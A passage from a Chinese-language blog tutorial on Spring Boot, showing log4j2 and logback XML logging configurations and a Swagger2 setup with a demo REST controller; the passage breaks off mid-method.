class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!-- Configuration后面的status，这个用于设置log4j2自身内部的信息输出，可以不设置，当设置成trace时，</span><br><span class=\"line\">    你会看到log4j2内部各种详细输出。可以设置成OFF(关闭)或Error(只输出错误信息)</span><br><span class=\"line\">  --&gt;</span><br><span class=\"line\">&lt;Configuration status=&quot;INFO&quot;&gt;</span><br><span class=\"line\">    &lt;!-- 日志文件目录和压缩文件目录配置 --&gt;</span><br><span class=\"line\">    &lt;Properties&gt;</span><br><span class=\"line\">        &lt;Property name=&quot;fileName&quot;&gt;C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2&lt;/Property&gt;</span><br><span class=\"line\">        &lt;Property name=&quot;fileGz&quot;&gt;C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2\\\\7z&lt;/Property&gt;</span><br><span class=\"line\">    &lt;/Properties&gt;</span><br><span class=\"line\">    &lt;!--appender主要作用就是：①控制打印日志的地方、②打印日志的输出格式--&gt;</span><br><span class=\"line\">    &lt;Appenders&gt;</span><br><span class=\"line\">        &lt;!-- 输出控制台日志的配置 --&gt;</span><br><span class=\"line\">        &lt;Console name=&quot;console&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class=\"line\">            &lt;!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）--&gt;</span><br><span class=\"line\">            &lt;ThresholdFilter level=&quot;info&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot;/&gt;</span><br><span class=\"line\">            &lt;!-- 输出日志的格式 --&gt;</span><br><span class=\"line\">            &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;</span><br><span class=\"line\">        &lt;/Console&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;!-- 打印出所有的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档 --&gt;</span><br><span class=\"line\">        &lt;RollingRandomAccessFile name=&quot;infoFile&quot; fileName=&quot;$&#123;fileName&#125;/log-info.log&quot; immediateFlush=&quot;false&quot;</span><br><span class=\"line\">                                 filePattern=&quot;$&#123;fileGz&#125;/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log-info.gz&quot;&gt;</span><br><span class=\"line\">            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd &apos;at&apos; HH:mm:ss z&#125; [%t] %-5level %logger&#123;36&#125; %L %M - %msg%xEx%n&quot; /&gt;</span><br><span class=\"line\">            &lt;Policies&gt;</span><br><span class=\"line\">                &lt;TimeBasedTriggeringPolicy interval=&quot;6&quot; modulate=&quot;true&quot; /&gt;</span><br><span class=\"line\">                &lt;SizeBasedTriggeringPolicy size=&quot;100 MB&quot;/&gt;</span><br><span class=\"line\">            &lt;/Policies&gt;</span><br><span class=\"line\">            &lt;Filters&gt;</span><br><span class=\"line\">                &lt;!-- 只记录info和warn级别信息 --&gt;</span><br><span class=\"line\">                &lt;ThresholdFilter level=&quot;error&quot; onMatch=&quot;DENY&quot; onMismatch=&quot;NEUTRAL&quot;/&gt;</span><br><span class=\"line\">                &lt;ThresholdFilter level=&quot;info&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot; /&gt;</span><br><span class=\"line\">            &lt;/Filters&gt;</span><br><span class=\"line\">            &lt;!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 --&gt;</span><br><span class=\"line\">            &lt;DefaultRolloverStrategy max=&quot;50&quot;/&gt;</span><br><span class=\"line\">        &lt;/RollingRandomAccessFile&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;!-- 存储所有error信息 --&gt;</span><br><span class=\"line\">        &lt;RollingRandomAccessFile name=&quot;errorFile&quot; fileName=&quot;$&#123;fileName&#125;/log-error.log&quot; immediateFlush=&quot;false&quot;</span><br><span class=\"line\">                                 filePattern=&quot;$&#123;fileGz&#125;/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log-error.gz&quot;&gt;</span><br><span class=\"line\">            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd &apos;at&apos; HH:mm:ss z&#125; [%t] %-5level %logger&#123;36&#125; %L %M - %msg%xEx%n&quot; /&gt;</span><br><span class=\"line\">            &lt;Policies&gt;</span><br><span class=\"line\">                &lt;TimeBasedTriggeringPolicy interval=&quot;6&quot; modulate=&quot;true&quot; /&gt;</span><br><span class=\"line\">                &lt;SizeBasedTriggeringPolicy size=&quot;100 MB&quot;/&gt;</span><br><span class=\"line\">            &lt;/Policies&gt;</span><br><span class=\"line\">            &lt;Filters&gt;</span><br><span class=\"line\">                &lt;!-- 只记录error级别信息 --&gt;</span><br><span class=\"line\">                &lt;ThresholdFilter level=&quot;error&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot; /&gt;</span><br><span class=\"line\">            &lt;/Filters&gt;</span><br><span class=\"line\">            &lt;!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 --&gt;</span><br><span class=\"line\">            &lt;DefaultRolloverStrategy max=&quot;50&quot;/&gt;</span><br><span class=\"line\">        &lt;/RollingRandomAccessFile&gt;</span><br><span class=\"line\">    &lt;/Appenders&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;!-- 全局配置，默认所有的Logger都继承此配置 --&gt;</span><br><span class=\"line\">    &lt;Loggers&gt;</span><br><span class=\"line\">        &lt;!-- AsyncRoot - 异步记录日志 - 需要LMAX Disruptor的支持 --&gt;</span><br><span class=\"line\">        &lt;AsyncRoot level=&quot;info&quot; additivity=&quot;false&quot;&gt;</span><br><span class=\"line\">            &lt;AppenderRef ref=&quot;console&quot;/&gt;</span><br><span class=\"line\">            &lt;AppenderRef ref=&quot;infoFile&quot;/&gt;</span><br><span class=\"line\">            &lt;AppenderRef ref=&quot;errorFile&quot;/&gt;</span><br><span class=\"line\">        &lt;/AsyncRoot&gt;</span><br><span class=\"line\">    &lt;/Loggers&gt;</span><br><span class=\"line\">&lt;/Configuration&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Controller</span><br><span class=\"line\">public class TestController &#123;</span><br><span class=\"line\">    Logger logger = LogManager.getLogger(TestController.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    @RequestMapping(value = &quot;test&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public String test()&#123;</span><br><span class=\"line\">        logger.debug(&quot;test debug&quot;);</span><br><span class=\"line\">        logger.info(&quot;test info&quot;);</span><br><span class=\"line\">        logger.warn(&quot;test warn&quot;);</span><br><span class=\"line\">        logger.error(&quot;test error&quot;);</span><br><span class=\"line\">        logger.fatal(&quot;test fatal&quot;);</span><br><span class=\"line\">        return &quot;ok&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"logback-默认\"><a href=\"#logback-默认\" class=\"headerlink\" title=\"logback(默认)\"></a>logback(默认)</h5><p>在resouces下添加logback-spring.xml配置文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;configuration&gt;</span><br><span class=\"line\">\t&lt;include resource=&quot;org/springframework/boot/logging/logback/base.xml&quot; /&gt;</span><br><span class=\"line\">\t&lt;jmxConfigurator/&gt;</span><br><span class=\"line\">\t&lt;!--&lt;property name=&quot;log.path&quot; value=&quot;/home/jzyx/epmnew/logs&quot;/&gt;--&gt;</span><br><span class=\"line\">    &lt;property name=&quot;log.path&quot; value=&quot;D:\\\\Logs\\\\aipmanage\\\\logs\\\\&quot;/&gt;</span><br><span class=\"line\">\t&lt;!--&lt;property name=&quot;log.path&quot; value=&quot;\\\\opt&quot;/&gt;--&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;appender name=&quot;console&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt;</span><br><span class=\"line\">\t\t&lt;!-- Log message format --&gt;</span><br><span class=\"line\">\t\t&lt;encoder&gt;</span><br><span class=\"line\">\t\t\t&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %5level --- [%thread] %logger&#123;36&#125; : %msg%n&lt;/pattern&gt;</span><br><span class=\"line\">\t\t\t&lt;charset&gt;UTF-8&lt;/charset&gt;</span><br><span class=\"line\">\t\t&lt;/encoder&gt;</span><br><span class=\"line\">\t\t&lt;!-- deny all events with a level below DEBUG, that is TRACE  --&gt;</span><br><span class=\"line\">\t\t&lt;filter class=&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;level&gt;DEBUG&lt;/level&gt;</span><br><span class=\"line\">\t\t&lt;/filter&gt;</span><br><span class=\"line\">\t&lt;/appender&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;appender name=&quot;sysDailyRollingFile&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;</span><br><span class=\"line\">\t\t&lt;!--  &lt;file&gt;E:\\\\项目\\\\demoClientLog\\\\sys.log&lt;/file&gt;--&gt;</span><br><span class=\"line\">\t\t&lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;!-- daily rollover --&gt;</span><br><span class=\"line\">\t\t\t&lt;fileNamePattern&gt;$&#123;log.path&#125;\\\\demoClient-DEBUG-%d&#123;yyyyMMdd&#125;.log&lt;/fileNamePattern&gt;</span><br><span class=\"line\">\t\t\t&lt;!-- 保留30天的日志 --&gt;</span><br><span class=\"line\">\t\t\t&lt;maxHistory&gt;30&lt;/maxHistory&gt;</span><br><span class=\"line\">\t\t&lt;/rollingPolicy&gt;</span><br><span class=\"line\">\t\t&lt;encoder&gt;</span><br><span class=\"line\">\t\t\t&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %5level --- [%thread] %logger&#123;36&#125; : %msg%n&lt;/pattern&gt;</span><br><span class=\"line\">\t\t\t&lt;charset&gt;UTF-8&lt;/charset&gt;</span><br><span class=\"line\">\t\t&lt;/encoder&gt;</span><br><span class=\"line\">\t\t&lt;filter class=&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;level&gt;DEBUG&lt;/level&gt;</span><br><span class=\"line\">\t\t&lt;/filter&gt;</span><br><span class=\"line\">\t&lt;/appender&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;appender name=&quot;infoDailyRollingFile&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;</span><br><span class=\"line\">\t\t&lt;!-- &lt;file&gt;E:\\\\项目\\\\demoClientLog\\\\demoClient-info.log&lt;/file&gt; --&gt;</span><br><span class=\"line\">\t\t&lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;!-- daily rollover --&gt;</span><br><span class=\"line\">\t\t\t&lt;fileNamePattern&gt;$&#123;log.path&#125;\\\\demoClient-INFO-%d&#123;yyyyMMdd&#125;.log&lt;/fileNamePattern&gt;</span><br><span class=\"line\">\t\t\t&lt;!-- 保留30天的日志 --&gt;</span><br><span class=\"line\">\t\t\t&lt;maxHistory&gt;30&lt;/maxHistory&gt;</span><br><span class=\"line\">\t\t&lt;/rollingPolicy&gt;</span><br><span class=\"line\">\t\t&lt;encoder&gt;</span><br><span class=\"line\">\t\t\t&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %5level --- [%thread] %logger&#123;36&#125; : %msg%n&lt;/pattern&gt;</span><br><span class=\"line\">\t\t\t&lt;charset&gt;UTF-8&lt;/charset&gt;</span><br><span class=\"line\">\t\t&lt;/encoder&gt;</span><br><span class=\"line\">\t\t&lt;filter class=&quot;ch.qos.logback.classic.filter.LevelFilter&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;level&gt;INFO&lt;/level&gt;</span><br><span class=\"line\">\t\t\t&lt;onMatch&gt;ACCEPT&lt;/onMatch&gt;</span><br><span class=\"line\">\t\t\t&lt;onMismatch&gt;DENY&lt;/onMismatch&gt;</span><br><span class=\"line\">\t\t&lt;/filter&gt;</span><br><span class=\"line\">\t&lt;/appender&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;appender name=&quot;severeDailyRollingFile&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;</span><br><span class=\"line\">\t\t&lt;!-- &lt;file&gt;E:\\\\项目\\\\demoClientLog\\\\demoClient-severe.log&lt;/file&gt; --&gt;</span><br><span class=\"line\">\t\t&lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;!-- daily rollover --&gt;</span><br><span class=\"line\">\t\t\t&lt;fileNamePattern&gt;$&#123;log.path&#125;\\\\demoClient-ERROR-%d&#123;yyyyMMdd&#125;.log&lt;/fileNamePattern&gt;</span><br><span class=\"line\">\t\t\t&lt;!-- 保留30天的日志 --&gt;</span><br><span class=\"line\">\t\t\t&lt;maxHistory&gt;30&lt;/maxHistory&gt;</span><br><span class=\"line\">\t\t&lt;/rollingPolicy&gt;</span><br><span class=\"line\">\t\t&lt;encoder&gt;</span><br><span class=\"line\">\t\t\t&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %5level --- [%thread] %logger&#123;36&#125; : %msg%n&lt;/pattern&gt;</span><br><span class=\"line\">\t\t\t&lt;charset&gt;UTF-8&lt;/charset&gt;</span><br><span class=\"line\">\t\t&lt;/encoder&gt;</span><br><span class=\"line\">\t\t&lt;!-- deny all events with a level below WARN, that is TRACE, DEBUG, and INFO --&gt;</span><br><span class=\"line\">\t\t&lt;filter class=&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;level&gt;ERROR&lt;/level&gt;</span><br><span class=\"line\">\t\t&lt;/filter&gt;</span><br><span class=\"line\">\t&lt;/appender&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;logger name=&quot;com.bonc.demoClient&quot; level=&quot;DEBUG&quot;&gt;</span><br><span class=\"line\">\t\t&lt;appender-ref ref=&quot;infoDailyRollingFile&quot; /&gt;</span><br><span class=\"line\">\t\t&lt;appender-ref ref=&quot;severeDailyRollingFile&quot; /&gt;</span><br><span class=\"line\">\t&lt;/logger&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;!-- the root level of logging --&gt;</span><br><span class=\"line\">\t&lt;root level=&quot;INFO&quot;&gt;</span><br><span class=\"line\">\t\t&lt;appender-ref ref=&quot;sysDailyRollingFile&quot; /&gt;</span><br><span class=\"line\">\t\t&lt;appender-ref ref=&quot;infoDailyRollingFile&quot; /&gt;</span><br><span class=\"line\">\t\t&lt;appender-ref ref=&quot;severeDailyRollingFile&quot; /&gt;</span><br><span class=\"line\">\t&lt;/root&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private static final Logger logger = LoggerFactory.getLogger(ApiController.class);</span><br><span class=\"line\">.......</span><br><span class=\"line\">logger.info(&quot;.....&quot;);</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-Restful-API\"><a href=\"#2-Restful-API\" class=\"headerlink\" title=\"2.Restful API\"></a>2.Restful API</h4><p>使用swagger2</p>\n<ul>\n<li><p>依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  &lt;!-- Swagger依赖 注意版本一致--&gt;</span><br><span class=\"line\">  &lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.2.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.2.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>配置类</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Configuration</span><br><span class=\"line\">@EnableSwagger2</span><br><span class=\"line\">public class Swagger2 &#123;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * apis()设置监控路径</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public Docket createRestApi() &#123;</span><br><span class=\"line\">        return new Docket(DocumentationType.SWAGGER_2)</span><br><span class=\"line\">                .apiInfo(apiInfo())</span><br><span class=\"line\">                .select()</span><br><span class=\"line\">                .apis(RequestHandlerSelectors.basePackage(&quot;com.example.springboottemplate.controllers&quot;))</span><br><span class=\"line\">                .paths(PathSelectors.any())</span><br><span class=\"line\">                .build();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 创建api基本信息，会展示在文档页面</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private ApiInfo apiInfo() &#123;</span><br><span class=\"line\">        return new ApiInfoBuilder()</span><br><span class=\"line\">                .title(&quot;Swagger2 demo&quot;)</span><br><span class=\"line\">                .description(&quot;Spring Boot中使用Swagger2构建RESTful APIs&quot;)</span><br><span class=\"line\">                .version(&quot;1.0&quot;)</span><br><span class=\"line\">                .build();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用<br><br><strong>注意：要使用@RequestParam()接收参数，需要paramType=”query”</strong><br><br>具体参数信息:<a href=\"https://amphilicitezh.github.io/2017/12/04/swaggerui-introduce/\" target=\"_blank\" rel=\"noopener\">https://amphilicitezh.github.io/2017/12/04/swaggerui-introduce/</a></p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Api(value = &quot;测试接口类TestController&quot;)</span><br><span class=\"line\">@Controller</span><br><span class=\"line\">@ResponseBody</span><br><span class=\"line\">public class TestController &#123;</span><br><span class=\"line\">    Logger logger = LogManager.getLogger(TestController.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试get不带参数&quot;,notes = &quot;测试get不带参数&quot;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;test1&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    public String test()&#123;</span><br><span class=\"line\">        logger.debug(&quot;test debug&quot;);</span><br><span class=\"line\">        logger.info(&quot;test info&quot;);</span><br><span class=\"line\">        logger.warn(&quot;test warn&quot;);</span><br><span class=\"line\">        logger.error(&quot;test error&quot;);</span><br><span class=\"line\">        logger.fatal(&quot;test fatal&quot;);</span><br><span class=\"line\">        return &quot;ok&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试get带参数&quot;,notes = &quot;测试get带参数&quot;)</span><br><span class=\"line\">    @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, dataType = &quot;String&quot;,paramType = &quot;query&quot;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;test2&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    public String test2(@RequestParam(&quot;username&quot;) String username)&#123;</span><br><span class=\"line\">        if(!username.equals(&quot;&quot;) &amp;&amp; username != null)&#123;</span><br><span class=\"line\">            System.out.println(username);</span><br><span class=\"line\">            return username;</span><br><span class=\"line\">        &#125;else &#123;</span><br><span class=\"line\">            return &quot;null&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试post带实体参数&quot;, notes = &quot;测试post带实体参数&quot;)</span><br><span class=\"line\">    @ApiImplicitParam(name = &quot;user&quot;,value = &quot;用户名&quot;,required = true, dataType = &quot;Map&lt;String,Object&gt;&quot;)</span><br><span class=\"line\">    @ApiResponses(&#123;</span><br><span class=\"line\">           @ApiResponse(code = 400, message = &quot;请求参数没填好,注意为json&quot;),</span><br><span class=\"line\">           @ApiResponse(code = 404, message = &quot;请求路径没有或页面跳转路径不对&quot;),</span><br><span class=\"line\">           @ApiResponse(code = 500, message = &quot;服务器端发生错误&quot;)</span><br><span class=\"line\">   &#125;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;/test3&quot;, method = RequestMethod.POST)</span><br><span class=\"line\">    public String test3(@RequestBody Map&lt;String,Object&gt; user)&#123;</span><br><span class=\"line\">        System.out.println(user.get(&quot;username&quot;).toString());</span><br><span class=\"line\">        System.out.println(user.get(&quot;password&quot;).toString());</span><br><span class=\"line\">        return &quot;ok&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试post参数为String&quot;, notes = &quot;测试post参数为String&quot;)</span><br><span class=\"line\">    @ApiImplicitParams(&#123;</span><br><span class=\"line\">            @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;),</span><br><span class=\"line\">            @ApiImplicitParam(name = &quot;password&quot;, value = &quot;密码&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;/test4&quot;, method = RequestMethod.POST)</span><br><span class=\"line\">    public String 